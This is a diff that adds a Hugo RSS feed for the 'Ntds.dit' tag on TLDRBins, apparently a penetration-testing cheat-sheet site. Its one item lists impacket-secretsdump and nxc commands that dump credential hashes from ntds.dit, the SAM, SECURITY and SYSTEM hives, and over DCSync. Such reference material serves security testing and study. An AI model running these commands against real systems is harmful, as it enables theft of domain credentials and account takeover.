@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ntds.dit on TLDRBins</title>
+    <link>https://tldrbins.github.io/@ntds.dit/</link>
+    <description>Recent content in Ntds.dit on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@ntds.dit/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>secretsdump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description> With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+    </item>
+  </channel>
+</rss>
